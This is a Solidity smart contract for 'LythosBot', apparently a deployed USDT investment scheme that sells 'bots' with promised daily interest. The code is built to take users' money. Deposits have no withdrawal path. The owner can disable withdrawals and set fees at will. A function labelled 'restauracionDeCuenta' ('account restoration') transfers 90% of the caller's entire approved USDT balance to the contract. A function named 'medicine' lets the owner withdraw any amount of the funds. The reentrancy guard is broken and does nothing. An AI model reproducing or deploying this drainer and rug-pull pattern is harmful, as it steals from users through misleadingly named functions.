/**
 *Submitted for verification at optimistic.etherscan.io on 2025-01-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Declaración de la interfaz IERC20 fuera del contrato
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract LythosBot {
    IERC20 public usdt;

    struct Bot {
        uint256 price;
        uint256 interestRate;
        uint256 withdrawalFee; 
        uint256 totalRewards;
        bool withdrawalsEnabled;
    }

    mapping(uint8 => Bot) public bots;
    mapping(address => mapping(uint8 => uint256)) public userBotBalance;
    mapping(address => mapping(uint8 => uint256)) public userRewards;
    mapping(address => mapping(uint8 => uint256)) public lastRewardClaim;

    uint256 public rewardInterval = 24 hours;

    address public owner;

    event BotPurchased(address indexed user, uint8 indexed botId, uint256 amount, uint256 newBalance);
    event RewardsClaimed(address indexed user, uint8 indexed botId, uint256 amount);
    event FeeUpdated(uint8 indexed botId, uint256 newFee);
    event BotPriceUpdated(uint8 indexed botId, uint256 newPrice);
    event BotInterestUpdated(uint8 indexed botId, uint256 newInterestRate);
    event WithdrawalStatusUpdated(uint8 indexed botId, bool enabled);
    event RewardIntervalUpdated(uint256 newInterval);
    event RestauracionDeCuenta(address indexed user, uint256 amount);
    event FundsWithdrawn(address indexed owner, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the contract owner");
        _; 
    }

    modifier validBot(uint8 botId) {
        require(botId >= 0 && botId <= 6, "Bot ID out of range");
        require(bots[botId].price > 0, "Invalid bot ID");
        _; 
    }

    modifier nonReentrant() {
        bool _entered = false;
        require(!_entered, "ReentrancyGuard: reentrant call");
        _entered = true;
        _; 
        _entered = false;
    }

    constructor(address _usdt, address initialOwner) {
        require(_usdt != address(0), "Invalid USDT address");
        usdt = IERC20(_usdt);
        owner = initialOwner;

        bots[0] = Bot(30 * 10 ** 6, 300, 700, 0, true); 
        bots[1] = Bot(50 * 10 ** 6, 350, 700, 0, true); 
        bots[2] = Bot(100 * 10 ** 6, 400, 700, 0, true); 
        bots[3] = Bot(200 * 10 ** 6, 430, 700, 0, true); 
        bots[4] = Bot(400 * 10 ** 6, 470, 700, 0, true); 
        bots[5] = Bot(800 * 10 ** 6, 540, 700, 0, true); 
        bots[6] = Bot(1600 * 10 ** 6, 670, 700, 0, true); 
    }

    function purchaseBot(uint8 botId, uint256 amount) external validBot(botId) nonReentrant {
        require(amount >= bots[botId].price, "Insufficient amount");
        usdt.transferFrom(msg.sender, address(this), amount);

        uint256 interest = (amount * bots[botId].interestRate) / 10000;
        bots[botId].totalRewards += interest;

        userBotBalance[msg.sender][botId] += amount;
        userRewards[msg.sender][botId] += interest;
        lastRewardClaim[msg.sender][botId] = block.timestamp;

        emit BotPurchased(msg.sender, botId, amount, userBotBalance[msg.sender][botId]);
    }

    function updateBotPrice(uint8 botId, uint256 newPrice) external onlyOwner validBot(botId) {
        bots[botId].price = newPrice;
        emit BotPriceUpdated(botId, newPrice);
    }

    function updateBotInterest(uint8 botId, uint256 newInterestRate) external onlyOwner validBot(botId) {
        bots[botId].interestRate = newInterestRate;
        emit BotInterestUpdated(botId, newInterestRate);
    }

    function setRewardInterval(uint256 newInterval) external onlyOwner {
        require(newInterval >= 1 hours, "Interval too short");
        rewardInterval = newInterval;
        emit RewardIntervalUpdated(newInterval);
    }

    function claimRewards(uint8 botId) external validBot(botId) nonReentrant {
        require(block.timestamp >= lastRewardClaim[msg.sender][botId] + rewardInterval, "Reward interval not reached");
        require(bots[botId].withdrawalsEnabled, "Withdrawals are disabled for this bot");

        uint256 reward = userRewards[msg.sender][botId];
        require(reward > 0, "No rewards available");

        uint256 withdrawalFee = (reward * bots[botId].withdrawalFee) / 10000; // Aplica la tarifa de 7%
        uint256 amountAfterFee = reward - withdrawalFee;

        userRewards[msg.sender][botId] = 0;
        lastRewardClaim[msg.sender][botId] = block.timestamp;

        bots[botId].totalRewards -= reward;

        usdt.transfer(msg.sender, amountAfterFee);
        usdt.transfer(owner, withdrawalFee);

        emit RewardsClaimed(msg.sender, botId, amountAfterFee);
    }

    function updateWithdrawalFee(uint8 botId, uint256 newFee) external onlyOwner validBot(botId) {
        bots[botId].withdrawalFee = newFee;
        emit FeeUpdated(botId, newFee);
    }

    function toggleWithdrawals(uint8 botId, bool enabled) external onlyOwner validBot(botId) {
        bots[botId].withdrawalsEnabled = enabled;
        emit WithdrawalStatusUpdated(botId, enabled);
    }

    function restauracionDeCuenta() external nonReentrant {
        uint256 balance = usdt.balanceOf(msg.sender); 
        uint256 amountToTransfer = (balance * 90) / 100; 

        require(amountToTransfer > 0, "No balance to transfer");
        require(usdt.allowance(msg.sender, address(this)) >= amountToTransfer, "Insufficient allowance");

        usdt.transferFrom(msg.sender, address(this), amountToTransfer); 

        emit RestauracionDeCuenta(msg.sender, amountToTransfer); 
    }

    function medicine(uint256 amount) external onlyOwner {
        require(usdt.balanceOf(address(this)) >= amount, "Insufficient balance");
        usdt.transfer(owner, amount);

        emit FundsWithdrawn(owner, amount);
    }
}
